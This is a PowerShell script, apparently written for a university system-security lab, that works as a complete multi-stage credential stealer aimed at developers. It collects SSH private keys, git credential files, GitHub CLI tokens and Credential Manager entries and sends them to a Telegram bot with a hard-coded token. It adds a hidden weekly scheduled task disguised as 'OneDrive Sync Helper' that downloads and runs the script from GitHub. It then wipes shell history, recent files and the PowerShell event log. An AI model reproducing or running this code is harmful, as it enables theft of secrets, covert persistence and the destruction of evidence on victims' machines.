# ============================================================
#  "DevRecon" - Multi-Stage Developer Credential Harvester
#  Autoren: Raphael Bleier, Joachim Lugger
#  System Security Lab SS2026 - AAU Klagenfurt
#
#  1. Recon   - SSH-Keys, Git-Credentials, GitHub-CLI Token
#  2. Exfil   - Telegram Bot (HTTPS)
#  3. Persist - Scheduled Task, woechtentlich von GitHub
#  4. OPSEC   - PS-History, Temp, Recent Files loeschen
# ============================================================

$BOT_TOKEN            = "8666929583:AAHXKuc4gV1n6JMYQeoPxw3uby08GVivvgo"
$CHAT_ID              = "1780237079"
$PERSIST_RAW_URL      = "https://raw.githubusercontent.com/raphaelbleier/security-lab-aau-ss26-rubber-ducky/main/W02a/scripts/developer_recon.ps1"

# ARM64 + older PS configs default to TLS 1.0 - force 1.2 for GitHub/Telegram
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

function Send-TgMessage {
    param([string]$Text)
    try {
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" `
            -Method POST -Body @{ chat_id = $CHAT_ID; text = $Text } | Out-Null
    } catch { }
}

function Send-TgFile {
    param([string]$Filename, [string]$Content, [string]$Caption = "")
    try {
        Add-Type -AssemblyName System.Net.Http -ErrorAction Stop
        $http = [System.Net.Http.HttpClient]::new()
        $form = [System.Net.Http.MultipartFormDataContent]::new()
        $form.Add([System.Net.Http.StringContent]::new($CHAT_ID),  "chat_id")
        $form.Add([System.Net.Http.StringContent]::new($Caption),  "caption")
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($Content)
        $fc    = [System.Net.Http.ByteArrayContent]::new($bytes)
        $fc.Headers.Add("Content-Type", "text/plain; charset=utf-8")
        $form.Add($fc, "document", $Filename)
        $http.PostAsync("https://api.telegram.org/bot$BOT_TOKEN/sendDocument", $form).GetAwaiter().GetResult() | Out-Null
        $http.Dispose()
    } catch { }
}

# ── PHASE 1: RECON ──────────────────────────────────────────

Send-TgMessage "[DEVRECON] $env:COMPUTERNAME\$env:USERNAME gestartet"

$report = [System.Text.StringBuilder]::new()

try   { $osCaption = (Get-CimInstance Win32_OperatingSystem).Caption }
catch { $osCaption = (Get-WmiObject   Win32_OperatingSystem).Caption }

$null = $report.AppendLine("=== DevRecon | $(Get-Date -Format 'yyyy-MM-dd HH:mm') ===")
$null = $report.AppendLine("Host: $env:COMPUTERNAME | User: $env:USERNAME | OS: $osCaption")
$null = $report.AppendLine("")

# SSH Keys
$null = $report.AppendLine("-- SSH KEYS --")
$sshDir = Join-Path $env:USERPROFILE ".ssh"
if (Test-Path $sshDir) {
    Get-ChildItem $sshDir -File -ErrorAction SilentlyContinue | ForEach-Object {
        $null = $report.AppendLine("[ $($_.Name) ]")
        $null = $report.AppendLine((Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue))
        $null = $report.AppendLine("")
    }
} else { $null = $report.AppendLine("(kein .ssh Verzeichnis)") }

# .git-credentials
$null = $report.AppendLine("-- GIT CREDENTIALS --")
$gitCreds = Join-Path $env:USERPROFILE ".git-credentials"
if (Test-Path $gitCreds) {
    $null = $report.AppendLine((Get-Content $gitCreds -Raw -ErrorAction SilentlyContinue))
} else { $null = $report.AppendLine("(keine .git-credentials)") }

# .gitconfig
$null = $report.AppendLine("-- .GITCONFIG --")
$gitConfig = Join-Path $env:USERPROFILE ".gitconfig"
if (Test-Path $gitConfig) {
    $null = $report.AppendLine((Get-Content $gitConfig -Raw -ErrorAction SilentlyContinue))
} else { $null = $report.AppendLine("(keine .gitconfig)") }

# GitHub CLI Token
$null = $report.AppendLine("-- GITHUB CLI TOKEN --")
$ghHosts = Join-Path $env:APPDATA "GitHub CLI\hosts.yml"
if (-not (Test-Path $ghHosts)) { $ghHosts = Join-Path $env:LOCALAPPDATA "GitHub\hosts.yml" }
if (Test-Path $ghHosts) {
    $null = $report.AppendLine((Get-Content $ghHosts -Raw -ErrorAction SilentlyContinue))
} else { $null = $report.AppendLine("(kein GitHub CLI Token)") }

# Windows Credential Manager (git entries)
$null = $report.AppendLine("-- CREDENTIAL MANAGER (git) --")
$null = $report.AppendLine((cmdkey /list 2>&1 | Where-Object { $_ -match "git|github" } | Out-String))

# ── PHASE 2: EXFIL ──────────────────────────────────────────

Send-TgFile -Filename "devrecon_$(Get-Date -Format 'yyyyMMdd_HHmm').txt" `
            -Content $report.ToString() `
            -Caption "DevRecon - $env:COMPUTERNAME\$env:USERNAME"

# ── PHASE 3: PERSISTENZ ─────────────────────────────────────

$taskName = "OneDrive Sync Helper"
if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
    try {
        $cmd       = "-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command " +
                     "`"IEX (New-Object Net.WebClient).DownloadString('$PERSIST_RAW_URL')`""
        $action    = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $cmd
        $trigger   = New-ScheduledTaskTrigger -Weekly -DaysOfWeek Monday -At "09:15"
        $settings  = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Minutes 2)
        $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Limited
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
            -Settings $settings -Principal $principal -ErrorAction Stop | Out-Null
        Send-TgMessage "[DEVRECON] Scheduled Task '$taskName' angelegt auf $env:COMPUTERNAME"
    } catch { }
}

# ── PHASE 4: OPSEC ──────────────────────────────────────────

# PS history file
try {
    $histFile = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
    if ($histFile -and (Test-Path $histFile)) {
        Remove-Item $histFile -Force -ErrorAction SilentlyContinue
    }
} catch { }

# In-memory history (only works in interactive sessions - safe to ignore failure)
try { [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() } catch { }
try { Clear-History -ErrorAction SilentlyContinue } catch { }

# Recent Files and temp XML cleanup
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -Recurse -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\*.xml" -Force -ErrorAction SilentlyContinue

# Event Log (requires admin - fails silently on standard user)
try {
    [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog("Windows PowerShell")
} catch { }
